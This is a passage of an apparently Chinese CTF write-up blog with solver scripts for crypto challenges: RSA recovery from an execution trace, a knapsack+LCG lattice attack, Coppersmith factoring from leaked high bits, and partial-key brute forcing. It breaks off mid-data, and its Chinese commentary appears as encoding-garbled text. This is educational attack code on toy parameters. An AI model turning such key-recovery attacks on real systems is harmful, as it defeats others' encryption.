class="title">isOdd</span>(<span class="params">a</span>):</span></span><br><span class="line">    <span class="keyword">return</span> a &amp; <span class="number">1</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;trace.out&#x27;</span>, <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">a = f.read().split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">l = <span class="built_in">len</span>(a)</span><br><span class="line">phi = <span class="number">1</span></span><br><span class="line">e = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l-<span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;task.py(6):     while b != 0:&#x27;</span> == a[i]:</span><br><span class="line">        idx = i</span><br><span class="line">        ct = a[idx: idx+<span class="number">13</span>]</span><br><span class="line">        <span class="keyword">if</span> if_exc(ct):</span><br><span class="line">            phi, e = e, phi</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;task.py(9):                 a = a - b&#x27;</span> <span class="keyword">in</span> ct <span class="keyword">and</span> <span class="string">&quot;task.py(10):                 a = rshift1(a)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            phi = <span class="number">2</span> * phi + e</span><br><span class="line">            <span class="keyword">if</span> isOdd(phi):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                phi = phi + <span class="number">1</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;task.py(14):                 b = rshift1(b)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            e *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&quot;task.py(19):                 a = rshift1(a)&quot;</span> <span class="keyword">in</span> ct:</span><br><span class="line">            phi *= <span class="number">2</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">64885875317556090558238994066256805052213864161514435285748891561779867972960805879348109302233463726130814478875296026610171472811894585459078460333131491392347346367422276701128380739598873156279173639691126814411752657279838804780550186863637510445720206103962994087507407296814662270605713097055799853102</span></span><br><span class="line">n = <span class="number">113793513490894881175568252406666081108916791207947545198428641792768110581083359318482355485724476407204679171578376741972958506284872470096498674038813765700336353715590069074081309886710425934960057225969468061891326946398492194812594219890553185043390915509200930203655022420444027841986189782168065174301</span></span><br><span class="line">d = inverse(e, phi)</span><br><span class="line"><span class="built_in">print</span>(phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c, d, n)))</span><br></pre></td></tr></table></figure><h3 id="fill"><a href="#fill" class="headerlink" title="fill"></a>fill</h3><p>èƒŒåŒ…+lcgå¥—å¨ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> inverse</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line">S = <span class="number">492226042629702</span></span><br><span class="line">nbits = <span class="number">32</span></span><br><span class="line">n = <span class="number">991125622</span></span><br><span class="line">s0, s1, s2 = <span class="number">562734112</span>, <span class="number">859151551</span>, <span class="number">741682801</span></span><br><span class="line">m = (s2 - s1) * inverse(s1 - s0, n) % n </span><br><span class="line">c = (s2 - m * s1) % n</span><br><span class="line">s = [<span class="number">0</span>] * nbits</span><br><span class="line">s[<span class="number">0</span>] = s0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, nbits):</span><br><span class="line">    s[i] = (s[i-<span class="number">1</span>]*m+c)%n</span><br><span class="line"><span class="comment"># print(s)</span></span><br><span class="line">M = [<span class="number">19621141192340</span>, <span class="number">39617541681643</span>, <span class="number">3004946591889</span>, <span class="number">6231471734951</span>, <span class="number">3703341368174</span>, <span class="number">48859912097514</span>, <span class="number">4386411556216</span>, <span class="number">11028070476391</span>, <span class="number">18637548953150</span>, <span class="number">29985057892414</span>, <span class="number">20689980879644</span>, <span class="number">20060557946852</span>, <span class="number">46908191806199</span>, <span class="number">8849137870273</span>, <span class="number">28637782510640</span>, <span class="number">35930273563752</span>, <span class="number">20695924342882</span>, <span class="number">36660291028583</span>, <span class="number">10923264012354</span>, <span class="number">29810154308143</span>, <span class="number">4444597606142</span>, <span class="number">31802472725414</span>, <span class="number">23368528779283</span>, <span class="number">15179021971456</span>, <span class="number">34642073901253</span>, <span class="number">44824809996134</span>, <span class="number">31243873675161</span>, <span class="number">27159321498211</span>, <span class="number">2220647072602</span>, <span class="number">20255746235462</span>, <span class="number">24667528459211</span>, <span class="number">46916059974372</span>]</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    M[t] = M[t] - s[t]</span><br><span class="line">A = Matrix(ZZ,nbits+<span class="number">1</span>,nbits+<span class="number">1</span>)</span><br><span class="line"><span class="comment"># fill in the identity matrix</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    A[i,i] = <span class="number">1</span></span><br><span class="line"><span class="comment"># replace the bottom row with your public key</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    A[i,nbits] = M[i]</span><br><span class="line"><span class="comment"># last element is the encoded message</span></span><br><span class="line">A[nbits,nbits] = -<span class="built_in">int</span>(S)</span><br><span class="line">res = A.LLL()</span><br><span class="line"><span class="built_in">print</span>(res[-<span class="number">1</span>][:-<span class="number">1</span>]) <span class="comment">#need to remove last element 0</span></span><br><span class="line">msg = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(nbits):</span><br><span class="line">    msg += <span class="built_in">str</span>(res[-<span class="number">1</span>][:-<span class="number">1</span>][i])</span><br><span class="line">msg = <span class="built_in">int</span>(msg, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(msg)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + sha256(<span class="built_in">str</span>(msg).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="little-little-fermat"><a href="#little-little-fermat" class="headerlink" title="little little fermat"></a>little little fermat</h3><p>é«˜ä½ç›¸åŒï¼Œå¼€æ ¹å–é«˜ä½ï¼Œç„¶åcopperå°±åˆ†è§£ï¼Œæ±‚é˜¶é‚£é‡Œç›´æ¥ç”¨order</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, isPrime</span><br><span class="line">n = <span class="number">141321067325716426375483506915224930097246865960474155069040176356860707435540270911081589751471783519639996589589495877214497196498978453005154272785048418715013714419926299248566038773669282170912502161620702945933984680880287757862837880474184004082619880793733517191297469980246315623924571332042031367393</span></span><br><span class="line">c = <span class="number">81368762831358980348757303940178994718818656679774450300533215016117959412236853310026456227434535301960147956843664862777300751319650636299943068620007067063945453310992828498083556205352025638600643137849563080996797888503027153527315524658003251767187427382796451974118362546507788854349086917112114926883</span></span><br><span class="line"></span><br><span class="line">p_high = <span class="number">1722441419253596810002937511265334240319736590159222908199095871448693784787182036443</span></span><br><span class="line">PR.&lt;z&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = z + p_high*<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>)</span><br><span class="line">z0 = f.small_roots(X=<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>), beta=<span class="number">0.4</span>)</span><br><span class="line">p_q = []</span><br><span class="line"><span class="keyword">for</span> z <span class="keyword">in</span> z0:</span><br><span class="line">    p = <span class="built_in">int</span>(z + p_high*<span class="number">2</span>^(<span class="number">512</span>-<span class="number">280</span>))</span><br><span class="line">    <span class="keyword">if</span> isPrime(p):</span><br><span class="line">        p_q.append(p)</span><br><span class="line">p = <span class="built_in">max</span>(p_q)</span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(<span class="number">65537</span>, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">G=GF(p)</span><br><span class="line">x = G(<span class="number">114514</span>).order() - <span class="number">1</span></span><br><span class="line">x = x^<span class="number">2</span></span><br><span class="line"><span class="built_in">print</span>(long_to_byets(m^^x))</span><br></pre></td></tr></table></figure><h3 id="leak-rsa"><a href="#leak-rsa" class="headerlink" title="leak_rsa"></a>leak_rsa</h3><p>æ€»çš„é€»è¾‘æ˜¯å…ˆç”¨dçš„é«˜ä½å»çˆ†ç ´32ä½çš„kï¼Œå†ç”¨kå»çˆ†ç ´pqdï¼Œç¬¬ä¸€æ­¥çš„ä»£ç ç›´æ¥æŠ„githubä¸Šçš„<a href="https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/test/test_factorization.py#L46ï¼Œä½†æ˜¯å› ä¸ºæ˜¯32bitè¦ç”¨å¤šè¿›ç¨‹æ‰è·‘çš„å‡ºï¼š">https://github.com/jvdsn/crypto-attacks/blob/5c7989ceac599f1f8e016b5afb0d2966759cd470/test/test_factorization.py#L46ï¼Œä½†æ˜¯å› ä¸ºæ˜¯32bitè¦ç”¨å¤šè¿›ç¨‹æ‰è·‘çš„å‡ºï¼š</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_params_prob</span>():</span></span><br><span class="line">    n = <span class="number">73380160475470842653695210816683702314062827937540324056880543809752271506601290265975543542548117392788987830919581511428492717214125296973338501980504384307279414528799452106399062576988406269897425829853390463840834798274139351938197666753546672052277640048588091137812362810008344723302886421059831149393</span></span><br><span class="line">    e = <span class="number">3116872133</span></span><br><span class="line">    c = <span class="number">69574121902821459446683688068339366486115223765903849266663001038736496551168104587683366853482649748413400537793260948337629422998336301256862519087984048032673577462034223842650399943613576577927825123830629917138007035313624847266208032195071033675853881447717750353382112841885318776240405314057286867952</span></span><br><span class="line">    hint1 = &#123;<span class="number">120</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">401</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">58</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">420</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">192</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">164</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">100</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">227</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">497</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">284</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">110</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">257</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">31</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">68</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">2</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">206</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">174</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">326</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">320</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">50</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">7</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">128</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">54</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">15</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">222</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">166</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">496</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">151</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">317</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">449</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">181</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">288</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">80</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">69</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">410</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">127</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">308</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">39</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">258</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">235</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">94</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">427</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">352</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">123</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">316</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">3</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">88</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">390</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">450</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">397</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">309</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">487</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">207</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">234</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">144</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">229</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">253</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">384</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">359</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">104</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">339</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">142</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">452</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">480</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">224</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">310</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">98</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">508</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">133</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">170</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">146</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">101</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">416</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">387</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">67</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">285</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">213</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">162</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">14</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">485</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">413</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">312</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">458</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">75</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">242</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">177</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">30</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">501</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">434</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">456</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">264</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">407</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">135</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">84</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">476</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">471</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">191</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">176</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">29</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">156</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">26</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">322</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">364</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">321</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">351</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">230</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">345</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">432</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">36</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">296</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">79</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">23</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">290</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">117</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">507</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">421</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">274</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">6</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">204</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">383</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">305</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">113</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">334</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">85</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">511</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">464</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">491</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">370</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">92</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">495</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">279</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">346</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">16</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">87</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">243</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">461</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">256</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">17</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">276</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">147</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">187</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">112</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">218</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">78</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">411</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">343</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">10</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">271</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">378</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">269</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">291</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">289</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">132</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">9</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">408</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">398</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">468</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">124</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">236</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">377</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">83</span>: <span class="string">&#x27;0&#x27;</span>&#125;</span><br><span class="line">    hint2 = &#123;<span class="number">125</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">86</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">8</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">498</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">311</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">93</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">385</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">315</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">300</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">454</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">152</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">205</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">400</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">348</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">18</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">154</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">51</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">435</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">25</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">430</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">72</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">136</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">294</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">466</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">388</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">428</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">440</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">250</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">506</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">48</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">270</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">318</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">107</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">327</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">474</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">325</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">281</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">392</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">473</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">13</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">90</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">278</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">425</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">109</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">423</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">412</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">190</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">171</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">475</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">441</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">336</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">371</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">323</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">22</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">469</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">451</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">438</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">203</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">121</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">52</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">494</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">399</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">314</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">24</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">183</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">492</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">246</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">108</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">379</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">460</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">56</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">372</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">313</span>: <span class="string">&#x27;1&#x27;</span>, <span class="number">44</span>: <span class="string">&#x27;0&#x27;</span>, <span class="number">237</span>: <span class="string">&#x27;1&#x27;</span>, <span 